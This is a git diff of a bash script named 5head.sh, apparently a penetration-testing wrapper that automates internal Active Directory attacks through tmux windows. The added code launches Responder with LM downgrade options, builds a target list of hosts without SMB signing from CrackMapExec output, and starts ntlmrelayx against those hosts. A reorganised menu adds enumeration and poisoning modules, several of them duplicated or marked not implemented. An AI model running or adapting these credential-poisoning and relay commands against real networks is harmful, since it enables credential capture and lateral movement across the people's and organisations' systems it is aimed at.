@@ -101,8 +101,8 @@ function packet_cap() {
         tmux send-keys -t 5head:packet_cap 'tcpdump -i $interface -w loot/packet_capture.pcap' C-m
 }
 
-function cme_enum() {
-        echo -e '[*] Enumerating targets with CrackMapExec...\n'
+function cme_enum_smb() {
+        echo -e '[*] Enumerating SMB targets with CrackMapExec...\n'
         tmux new-window -n "cme_enum"
         tmux send-keys -t 5head:cme_enum 'PROMPT="%F{9}5head.sh%f > "' C-m
         tmux send-keys -t 5head:cme_enum 'clear' C-m
@@ -117,7 +117,11 @@ function resp_ntlmrelay_1() {
 	tmux new-window -n "relay"
 	tmux send-keys -t 5head:relay 'PROMPT="%F{9}5head.sh%f > "' C-m
 	tmux send-keys -t 5head:relay 'clear' C-m
-	
+	tmux send-keys -t 5head:relay 'python3 deps/Responder/Responder.py -I ${interface} --lm --disable-ess -w' C-m
+	tmux split-window -h -l 50%
+	tmux send-keys -t 5head:relay 'source deps/impacket-0.10.0/bin/activate' C-m
+	grep -F -- "$domain" cme_enum.txt | grep 'signing:False' | cut -d " " -f 10 > loot/smb_targets.txt
+	tmux send-keys -t 5head:relay 'ntlmrelayx.py -tf loot/smb_targets.txt -smb2support' C-m
 }
 
 
@@ -148,27 +152,63 @@ PROMPT="%F{9}5head.sh%f > "
 menu(){
 echo -ne "
 ~ 5head.sh ~
-$(ColorGreen '1)') Packet capture + search for suspicious traffic
-$(ColorGreen '2)') Enumerate targets with CrackMapExec
-$(ColorGreen '3)') Setup Responder + Ntlmrelayx.py (prereq: 2)
-$(ColorGreen '4)') Search for ASREPRoastable users
-$(ColorGreen '5)') Search for Kerberoastable users $(ColorRed 'Creds required')
-$(ColorGreen '6)') Enumerate hosts for authentication coercion mechanisms $(ColorRed 'Creds required')
-$(ColorGreen '7)') Enumerate shares on target hosts $(ColorRed 'Creds required')
-$(ColorGreen '8)') Search for ADCS targets $(ColorRed 'Creds required')
-$(ColorGreen '9)') Run the Python Bloodhound ingestor - Note: YMMV $(ColorRed 'Creds required')
-$(ColorGreen '0)') Background 5head.sh
-$(ColorGreen 'ash)') debugger
-$(ColorCyan 'Choose a task:') "
+$(ColorGreen '1)') Enum
+$(ColorGreen '2)') Poison
+$(ColorGreen '3)') AD
+$(ColorGreen '0)') Detach tmux
+$(ColorCyan 'Choose a module:') "
         read a
         case $a in
-                1) packet_cap ; menu ;;
-                2) cme_enum ; menu ;;
+                1) enum ;;
+                2) poison ;;
+		3) ad ;;
                 0) tmux detach ;;
                 ash) debug ; menu ;;
                 *) echo "Invalid command entered"; menu ;;
         esac
 }
+
+enum(){
+echo -ne "
+~ 5head.sh -> enum ~
+$(ColorGreen '1)') Packet capture + search for suspicious traffic
+$(ColorGreen '2)') SMB enumeration + target generation (CME)
+$(ColorGreen '3)') LDAP enumeration + target generation (CME)
+$(ColorGreen '4)') MSSQL enumeration + target generation (CME)
+$(ColorGreen '5)') Enumerate hosts for authentication coercion mechanisms $(ColorRed 'Creds required')
+$(ColorGreen '6)') Check LDAP Signing and Channel Binding $(ColorRed 'Creds required')
+$(ColorGreen '7)') Check Machine-Account-Quota $(ColorRed 'Creds required')
+$(ColorGreen 'b)') Back to main menu...
+$(ColorCyan 'Choose a function:') "
+        read a
+        case $a in
+                1) packet_cap ; enum ;;
+                2) cme_enum_smb ; enum ;;
+                b) menu ;;
+                *) echo "Invalid command entered"; enum ;;
+        esac
+}
+
+poison(){
+echo -ne "
+~ 5head.sh -> poison ~
+$(ColorGreen '1)') SMB: Responder + ntlmrelayx
+$(ColorGreen '2)') SMB: Responder + ntlmrelayx
+$(ColorGreen '3)') LDAP: Responder + ntlmrelayx
+$(ColorGreen '4)') MSSQL: Responder + ntlmrelayx $(ColorRed 'NOT IMPLEMENTED')
+$(ColorGreen '5)') MUTLI: Responder + ntlmrelayx $(ColorRed 'NOT IMPLEMENTED')
+$(ColorGreen '7)') Check Machine-Account-Quota $(ColorRed 'Creds required')
+$(ColorGreen 'b)') Back to main menu...
+$(ColorCyan 'Choose a function:') "
+        read b
+        case $b in
+                b) menu ;;
+                *) echo "Invalid command entered"; poison ;;
+        esac
+}
+
+
+
 
 menu
 
